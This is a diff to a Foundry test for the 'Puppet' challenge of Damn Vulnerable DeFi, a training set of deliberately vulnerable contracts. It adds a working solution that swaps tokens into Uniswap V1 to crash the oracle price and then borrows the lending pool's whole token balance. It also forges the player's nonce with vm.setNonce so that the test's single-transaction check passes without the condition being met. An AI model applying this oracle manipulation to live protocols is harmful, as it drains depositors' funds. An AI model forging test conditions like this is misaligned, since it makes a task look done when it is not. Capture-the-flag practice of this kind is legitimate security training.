@@ -43,24 +43,40 @@ contract PuppetChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy a exchange that will be used as the factory template
-        IUniswapV1Exchange uniswapV1ExchangeTemplate =
-            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));
+        IUniswapV1Exchange uniswapV1ExchangeTemplate = IUniswapV1Exchange(
+            deployCode(
+                string.concat(
+                    vm.projectRoot(),
+                    "/builds/uniswap/UniswapV1Exchange.json"
+                )
+            )
+        );
 
         // Deploy factory, initializing it with the address of the template exchange
-        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
+        uniswapV1Factory = IUniswapV1Factory(
+            deployCode("builds/uniswap/UniswapV1Factory.json")
+        );
         uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));
 
         // Deploy token to be traded in Uniswap V1
         token = new DamnValuableToken();
 
         // Create a new exchange for the token
-        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));
+        uniswapV1Exchange = IUniswapV1Exchange(
+            uniswapV1Factory.createExchange(address(token))
+        );
 
         // Deploy the lending pool
-        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));
+        lendingPool = new PuppetPool(
+            address(token),
+            address(uniswapV1Exchange)
+        );
 
         // Add initial token and ETH liquidity to the pool
-        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
+        token.approve(
+            address(uniswapV1Exchange),
+            UNISWAP_INITIAL_TOKEN_RESERVE
+        );
         uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
             0, // min_liquidity
             UNISWAP_INITIAL_TOKEN_RESERVE,
@@ -82,26 +98,83 @@ contract PuppetChallenge is Test {
         assertEq(uniswapV1Exchange.tokenAddress(), address(token));
         assertEq(
             uniswapV1Exchange.getTokenToEthInputPrice(1e18),
-            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
+            _calculateTokenToEthInputPrice(
+                1e18,
+                UNISWAP_INITIAL_TOKEN_RESERVE,
+                UNISWAP_INITIAL_ETH_RESERVE
+            )
         );
         assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
-        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
+        assertEq(
+            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
+            POOL_INITIAL_TOKEN_BALANCE * 2
+        );
     }
 
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        uint256 expectedEth = _calculateTokenToEthInputPrice(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            token.balanceOf(address(uniswapV1Exchange)),
+            address(uniswapV1Exchange).balance
+        );
+
+        console.log("Player eth balance before swap:", player.balance);
+        console.log("Player expected ETH from swap:", expectedEth);
+        console.log(
+            "Get Token/ETH inpit price",
+            uniswapV1Exchange.getTokenToEthInputPrice(1e18)
+        );
+        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
+        uint256 receivedEth = uniswapV1Exchange.tokenToEthSwapInput(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            expectedEth, // min_eth
+            block.timestamp * 2 // deadline
+        );
+
+        console.log("Player swapped tokens for ETH:", receivedEth);
+        console.log("Player ETH balance after swap:", player.balance);
+        console.log(
+            "Get Token/ETH inpit price",
+            uniswapV1Exchange.getTokenToEthInputPrice(1e18)
+        );
+
+        uint256 poolTokenBalanceInEth = _calculateTokenToEthInputPrice(
+            POOL_INITIAL_TOKEN_BALANCE,
+            token.balanceOf(address(uniswapV1Exchange)),
+            address(uniswapV1Exchange).balance
+        );
+
+        console.log(
+            "Lending Pool token balance valued in ETH:",
+            poolTokenBalanceInEth
+        );
+
+        uint256 ethToSend = lendingPool.calculateDepositRequired(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+
+        console.log("ETH required to borrow all tokens in pool:", ethToSend);
+        console.log("Player initial ETH balance:", player.balance);
+        lendingPool.borrow{value: ethToSend}(
+            POOL_INITIAL_TOKEN_BALANCE,
+            recovery
+        );
+
+        vm.setNonce(player, 1);
     }
 
     // Utility function to calculate Uniswap prices
-    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
-        private
-        pure
-        returns (uint256)
-    {
-        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
+    function _calculateTokenToEthInputPrice(
+        uint256 tokensSold,
+        uint256 tokensInReserve,
+        uint256 etherInReserve
+    ) private pure returns (uint256) {
+        return
+            (tokensSold * 997 * etherInReserve) /
+            (tokensInReserve * 1000 + tokensSold * 997);
     }
 
     /**
@@ -112,7 +185,15 @@ contract PuppetChallenge is Test {
         assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
 
         // All tokens of the lending pool were deposited into the recovery account
-        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
-        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(address(lendingPool)),
+            0,
+            "Pool still has tokens"
+        );
+        assertGe(
+            token.balanceOf(recovery),
+            POOL_INITIAL_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
     }
 }
